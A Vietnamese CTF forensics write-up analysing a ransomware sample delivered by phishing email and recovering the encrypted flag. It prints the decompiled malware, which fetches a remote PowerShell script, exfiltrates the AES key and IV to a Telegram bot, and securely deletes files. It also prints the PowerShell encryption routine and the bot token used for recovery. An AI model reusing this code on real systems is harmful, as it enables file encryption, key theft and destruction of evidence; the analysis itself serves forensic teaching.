## Description
> Một nữ nhiên viên văn phòng ở công ty V đã nhận được một bức thư. Sau khi mở bức thư đó cùng với một tệp đính kèm, máy của cô nhân viên này đã có một số hoạt động bất thường cùng với đó là một file tài liệu rất quan trọng của cô ấy đã biến mất. Là một nhân viên phòng SOC, hãy giúp cô ấy tìm ra nguyên nhân và khôi phục lại file quan trọng đó. Format flag: flag{the_flag}

> Đề bài này liên quan đến vấn đề Ransomware. Người dùng vui lòng lưu ý rằng cần thực hiện trên máy ảo. Nếu chạy trên máy thật và gặp phải bất kỳ sự cố nào, Viblo CTF sẽ không chịu trách nhiệm.
## Solution
##### Challenge này cung cấp cho chúng ta 1 file disk có tên `Evidence.ad1`, load vào FTK imager để phân tích.
##### Tại đường dẫn Document/Outlook của user tamin ta dễ dàng tìm thấy 1 file email
![image](https://hackmd.io/_uploads/Hkz2FWpr1g.png)
##### Sử dụng các công cụ mở file eml online hoặc outlook để xem nội dung của thư
![image](https://hackmd.io/_uploads/Bys65ZTHkg.png)
##### Email được gửi với tệp đính kèm được attacker giả mạo là phần mềm diệt virus, tải xuống và giải nén ta thu được 1 file thực thi sử dụng PyInstaller 
![image](https://hackmd.io/_uploads/ryirhW6Hkx.png)
##### Tiến hành decompile để xem src gốc của nó bằng https://pyinstxtractor-web.netlify.app và https://pylingual.io. Và đây là mã nguồn
```python
import os
import requests
import subprocess
import zipfile
current_dir = os.path.dirname(os.path.abspath(__file__))
ps_script_url = 'https://raw.githubusercontent.com/TMQrX/temp/master/Qwertyu.ps1'
ps_script_path = os.path.join(current_dir, 'ps.ps1')
sdelete_zip_url = 'https://download.sysinternals.com/files/SDelete.zip'
sdelete_zip_path = os.path.join(current_dir, 'SDelete.zip')
sdelete_exe_path = os.path.join(current_dir, 'sdelete.exe')
flag_file_path = 'C:\\flag.txt'
temp_encrypt_folder = os.path.join(os.getenv('TEMP'), 'encrypt')

def download_file(url, destination):
Unsupported opcode: BEFORE_WITH
    response = requests.get(url)
# WARNING: Decompyle incomplete


def extract_sdelete(zip_path, extract_to):
Unsupported opcode: BEFORE_WITH
    pass
# WARNING: Decompyle incomplete


def execute_powershell_script(script_path):
    process = subprocess.run([
        'powershell.exe',
        '-File',
        script_path], capture_output = True, text = True)
    output = process.stdout.splitlines()
    if len(output) >= 2:
        cee = output[0].strip()
        vee = output[1].strip()
        return (cee, vee)


def send_to_telegram(key, iv, token, chat_id):
    message = f'''Key: {key}\nIV: {iv}'''
    url = f'''https://api.telegram.org/bot{token}/sendMessage'''
    data = {
        'chat_id': chat_id,
        'text': message,
        'protect_content': True }
    response = requests.post(url, data = data)


def securely_delete_files(ps_script_path, flag_file_path):
    if os.path.exists(ps_script_path):
        subprocess.run([
            sdelete_exe_path,
            ps_script_path], check = True)
    if os.path.exists(flag_file_path):
        subprocess.run([
            sdelete_exe_path,
            flag_file_path], check = True)
        return None


def delete_encrypt_folder(folder_path):
Unsupported opcode: JUMP_BACKWARD
    pass
# WARNING: Decompyle incomplete


def move_to_recycle_bin(item_path):
    ps_command = f'''\n    $shell = New-Object -ComObject Shell.Application\n    $folder = $shell.Namespace(0xA)\n    $folder.MoveHere("{item_path}")\n    '''
    subprocess.run([
        'powershell.exe',
        '-Command',
        ps_command], check = True)


def empty_recycle_bin():
    ps_command = '\n    $recycleBin = New-Object -ComObject Shell.Application\n    $binFolder = $recycleBin.Namespace(0xA)\n    $items = $binFolder.Items()\n    $items | ForEach-Object { Remove-Item $_.Path -Force -Recurse }\n    '
    subprocess.run([
        'powershell.exe',
        '-Command',
        ps_command], check = True)


def main():
    download_file(ps_script_url, ps_script_path)
    download_file(sdelete_zip_url, sdelete_zip_path)
    extract_sdelete(sdelete_zip_path, current_dir)
    (cee, vee) = execute_powershell_script(ps_script_path)
    if cee and vee:
        telegram_token = '7457737016:AAEvv7iDxEzpd9bxMmY9BBwZM0rE2e9Yef0'
        chat_id = '1617506446'
        send_to_telegram(cee, vee, telegram_token, chat_id)
    securely_delete_files(ps_script_path, flag_file_path)
    delete_encrypt_folder(temp_encrypt_folder)
    empty_recycle_bin()

if __name__ == '__main__':
    main()
    return None
```
##### Đoạn mã tiến hành tải xuống và thực thi file ps1 và trích xuất 2 giá trị cee và vee từ đầu ra của nó gửi lên telegram bot qua api. Sau đó sử dụng sdelete.exe để xóa file powershell này và file flag.txt
##### Cuối cùng là xóa luôn folder `encrypt`
##### Truy cập vào liên kết, ta thu được 1 lệnh thực thi base64
```
iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGJuY3hIblVUVHNEZ...NCn0NCg==')));exit
```
##### Sau khi decode mã đầu ra có vẻ bị obfuscate, sửa lại cho dễ nhìn 
![image](https://hackmd.io/_uploads/S1fSfMTBke.png)
```python
$path = 'C:\flag.txt'

$aes = New-Object System.Security.Cryptography.AesManaged
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.GenerateKey()
$aes.GenerateIV()

$keyBase64 = [System.Convert]::ToBase64String($aes.Key)
$ivBase64 = [System.Convert]::ToBase64String($aes.IV)

$fileBytes = [System.IO.File]::ReadAllBytes($path)

$encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
$encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)

$encryptedBase64 = [System.Convert]::ToBase64String($encryptedBytes)

[System.IO.File]::WriteAllText($path, $encryptedBase64)

Write-Output $keyBase64
Write-Output $ivBase64

$tempEncryptDir = Join-Path ([System.IO.Path]::GetTempPath()) 'encrypt'

if (!(Test-Path $tempEncryptDir)) {
    New-Item -ItemType Directory -Path $tempEncryptDir
}

$targetDir = $tempEncryptDir
$filePath = $path

if (!(Test-Path $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir
}

$fileContent = Get-Content -Path $filePath -Raw

$counter = 1

foreach ($char in $fileContent.ToCharArray()) {
    $cleanChar = $char -replace '[\\/:"*?<>|]', '_'
    $fileName = "$($counter * 111111)$cleanChar.txt"
    $newPath = Join-Path $targetDir $fileName
    New-Item -ItemType File -Path $newPath -Force
    Set-Content -Path $newPath -Value 'tmq'
    
    $counter++
}
```
##### Mã này tiến hành mã hóa file flag.txt bằng thuật toán aes với key và iv được tạo ngẫu nhiên. Dữ liệu sau khi giải mã được ghi từng kí tự vào tên các file với giá trị là "tmq" và tên được tính theo `"$($counter * 111111)$cleanChar.txt"` (trong đó cleanChar thay thế các kí tự `\\/:"*?<>|` thành `_` cho đúng với yêu cầu đặt tên file trong windows)
##### Oke, bây giờ bắt đầu tìm ciphertext, vì folder lưu tên file này đã bị xóa nên ta tiến hành soi windows event logs.
![image](https://hackmd.io/_uploads/rJ99NzpBkx.png)
##### Lưu về file txt để dễ dàng xử lý 
![image](https://hackmd.io/_uploads/BypySGaSJe.png)
![image](https://hackmd.io/_uploads/r1-HHfTBJg.png)

```
┌──(kali㉿kali)-[~/Downloads]
└─$ strings 2.txt | grep "encrypt" | awk -F 'encrypt\\\\' '{print $2}' | awk -F '.txt' '{print $1}' > extract
```
##### Bây giờ thêm 1 script để lấy phần ciphertext ra 
```python
with open("extract", "r", encoding="utf-8") as file:
    data = file.readlines()

processed_find_str = set() 
count = 1

while True:
    find_str = str(111111 * count) 
    if find_str in processed_find_str:
        count += 1
        continue

    matching_lines = []  

    for line in data:
        line = line.strip()  
        if line.startswith(find_str):  
            remaining = line[len(find_str):] 
            matching_lines.append(remaining)  

    if not matching_lines: 
        break

    shortest_remaining = min(matching_lines, key=len)
    print(shortest_remaining, end = '')  
    processed_find_str.add(find_str) 

    count += 1
```
```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 run.py 
iUA7NgcGzu5bisAZiTYG42l8EiwsX16DX4sw5VLboU_5Y2HOUve+dEJncWg08kdI  
```
##### Để lấy được key và iv trước tiên phải lấy thông tin bot cái đã, sử dụng method getMe
```
https://api.telegram.org/bot7457737016:AAEvv7iDxEzpd9bxMmY9BBwZM0rE2e9Yef0/getMe
```

![image](https://hackmd.io/_uploads/BkCTOMpSkg.png)
##### Vào telegram và start bot này
##### Research từ google mình nhận ra ta có thể sử dụng method forwardMessage của telegram để chuyển tiếp một tin nhắn từ một chat này sang một chat khác mà không thay đổi nội dung tin nhắn.
```
https://api.telegram.org/bot7457737016:AAEvv7iDxEzpd9bxMmY9BBwZM0rE2e9Yef0/forwardMessages?from_chat_id=1617506446&message_ids=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25]&chat_id=8051097960
```
##### Trong đó from_chat_id là id con bot của attacker, message_ids là id đoạn chat muốn chuyển tiếp, và chat_id là id chuyển tiếp đến (id của mình)
##### Tuy nhiên đầu ra lại không có gì hết
![image](https://hackmd.io/_uploads/HJbooGaBJx.png)
![image](https://hackmd.io/_uploads/HyjjiM6Hyl.png)
##### Tiếp tục tìm kiếm mình tìm thấy 1 method khác là copyMessage cho phép sao chép nội dung của một tin nhắn từ một chat này sang một chat khác. Tương tự như forwardMessages nhưng tin nhắn này sẽ được sao chép chứ không phải chuyển tiếp như forwardMessages thì ta thu được key và iv 
##### Lý giải cho việc tại sao cả 2 method lại đưa ra kết quả khác nhau vì khi sử dụng `'protect_content': True` trong API gửi tin nhắn của Telegram, mục đích là để bảo vệ nội dung tin nhắn khỏi việc bị sao chép hoặc chia sẻ lại. Điều này giúp bảo vệ tính bảo mật của tin nhắn, không cho phép người nhận hoặc người tiếp theo trong cuộc trò chuyện sao chép hoặc chuyển tiếp nội dung tin nhắn. 
```python
def send_to_telegram(key, iv, token, chat_id):
    message = f'''Key: {key}\nIV: {iv}'''
    url = f'''https://api.telegram.org/bot{token}/sendMessage'''
    data = {
        'chat_id': chat_id,
        'text': message,
        'protect_content': True }
    response = requests.post(url, data = data)
```
##### Ta có thể sao chép tin nhắn mặc dù nội dung được bảo vệ, vì cơ chế sao chép khác với việc chuyển tiếp, và Telegram có thể cho phép sao chép tin nhắn trong khi vẫn bảo vệ nội dung.




```
https://api.telegram.org/bot7457737016:AAEvv7iDxEzpd9bxMmY9BBwZM0rE2e9Yef0/copyMessages?from_chat_id=1617506446&message_ids=[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25]&chat_id=8051097960
```
![image](https://hackmd.io/_uploads/B1Zv6fpH1x.png)
##### Bây giờ thì decrypt dựa trên key và iv thu được thôi.
##### Vì đoạn ciphertext đã bị sửa nên ta cần chuyển về cho đúng base64
```
iUA7NgcGzu5bisAZiTYG42l8EiwsX16DX4sw5VLboU/5Y2HOUve+dEJncWg08kdI
```
![image](https://hackmd.io/_uploads/rkeR6MaS1x.png)

#### FLag : flag{rAnS0MWAR3_wiTH_Te1EgRam_is_FUn_r1ghT???}

